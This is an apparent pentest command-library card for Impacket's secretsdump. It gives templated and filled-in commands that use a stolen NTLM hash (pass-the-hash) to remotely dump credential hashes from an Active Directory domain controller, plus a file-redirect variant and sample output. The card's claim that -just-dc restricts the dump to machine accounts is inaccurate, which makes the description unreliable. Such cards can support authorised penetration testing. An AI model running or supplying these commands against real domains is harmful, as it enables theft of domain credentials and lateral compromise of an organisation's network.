---
id: 6d1ee821-0ff3-4b27-a622-d5b2fe92f272
name: secretsdump-dump-dc-hashes-with-ntlm
type: command
executor: python
data: ./secretsdump.py -hashes <NTLM hash> -just-dc PENTESTLAB/dc\$@<IP>
output: null
created_at: '2023-04-06T03:56:03.955026+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-dumping
  - ad-attacks
  - pass-the-hash
verified: true
validated: true
---

# secretsdump-dump-dc-hashes-with-ntlm

## Command

```python
secretsdump.py -hashes :$_NTLM_HASH -just-dc $_DOMAIN/dc$@$_DC_IP
```

## Description

This command uses an NTLM hash for pass-the-hash authentication to dump only Domain Controller hashes remotely, minimizing noise and focusing on machine accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -hashes :$_NTLM_HASH | NTLM hash in format :nthash (LM empty) | Yes |
| -just-dc | Limit dump to DC credentials only | Yes |
| $_DOMAIN/dc$@$_DC_IP | Target DC machine account (e.g., PENTESTLAB/dc$@192.168.1.10) | Yes |

## Examples

### Basic Usage

```python
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc AD/dc$@192.168.1.10
```

### Advanced Usage

```python
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc AD/dc$@192.168.1.10 > dc_hashes.txt
```

## Expected Output

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x...
PENTESTLAB\dc$:1001:aad3b435b51404eeaad3b435b51404ee:...

Success indicated by DC machine account hashes listed.
